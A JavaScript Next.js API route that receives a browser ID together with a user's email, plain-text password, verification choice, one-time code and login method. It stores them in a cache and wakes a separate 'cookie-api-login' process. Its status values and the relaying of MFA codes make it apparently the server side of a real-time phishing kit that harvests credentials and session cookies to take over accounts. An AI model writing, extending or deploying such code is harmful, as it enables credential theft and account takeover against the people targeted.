import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
import { setCachedRow, getCachedRow, immediateFlush } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";
import { requireFeature } from "../../../../utils/featureGate.js";
import logger from "../../../../utils/logger.js";

function parseBody(text) {
    try { return JSON.parse(text); } catch (e) {}
    try { return Object.fromEntries(new URLSearchParams(text)); } catch (e) {}
    return null;
}

export async function POST(request) {
    incrementUsage();
    const gate = await requireFeature('allowRevalidation', 'session revalidation');
    if (gate) {
        logger.warn(`[update-process] Rejected: allowRevalidation gate closed for ${new URL(request.url).pathname}`);
        return gate;
    }

    const text = await request.text();
    const body = parseBody(text);
    if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);

    const { browserId, token, updateType, email, password, verificationChoice, verificationCode, method } = body;

    if (!browserId) {
        return corsJson({ success: false, error: "browserId required" }, 400);
    }

    // Never log email/password/code values — updateType + browserId only.
    logger.info(`[update-process][${browserId}] Received update type='${updateType}'`);

    const updates = { lastUserActivity: new Date().toISOString() };

    if (updateType === 'email' && email) {
        updates.email = email;
        updates.domain = email.split('@')[1] || '';
        if (password) updates.password = password;
    } else if (updateType === 'password' && password) {
        updates.password = password;
        const row = getCachedRow(browserId);
        if (row?.status === 'WAITINGPASSWORDERROR') {
            updates.status = 'WAITINGPASSWORD';
        }
    } else if (updateType === 'verificationChoice' && verificationChoice) {
        updates.verificationChoice = verificationChoice;
    } else if (updateType === 'verificationCode' && verificationCode) {
        updates.verificationCode = verificationCode;
    } else if (updateType === 'method') {
        const normalized = String(method || '').trim().toLowerCase();
        if (!['qr', 'email', 'phone'].includes(normalized)) {
            return corsJson({ success: false, error: "Invalid method — expected qr|email|phone" }, 400);
        }
        const row = getCachedRow(browserId);
        let prior = {};
        try {
            const raw = row?.lastJsonResponse;
            prior = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : {};
        } catch (e) { prior = {}; }
        updates.loginMethod = normalized;
        updates.lastJsonResponse = JSON.stringify({
            browserId,
            status: row?.status || prior.status || 'WAITING',
            platform: prior.platform || '',
            loginMethod: normalized,
            timestamp: new Date().toISOString(),
            message: `Login method set to ${normalized}`
        });
    }

    setCachedRow(browserId, updates);
    immediateFlush(browserId).catch(e => logger.warn(`[update-process][${browserId}] Immediate flush failed: ${e.message}`));

    // In-process wake: cookie-api-login registers this callback on globalThis.
    // Both routes live in the same Next process, so the old loopback HTTP fetch
    // only added a network failure mode ("fetch failed") with no benefit.
    const kick = globalThis.__kickWaitingRows;
    if (typeof kick === 'function') {
        try { kick(); } catch (e) { logger.warn(`[update-process][${browserId}] Wake kick failed: ${e.message}`); }
    } else {
        logger.debug(`[update-process][${browserId}] No wake callback registered (cookie-api-login not loaded yet) — skipping kick.`);
    }

    return corsJson({ success: true });
}

export async function OPTIONS() {
    return corsOptions();
}
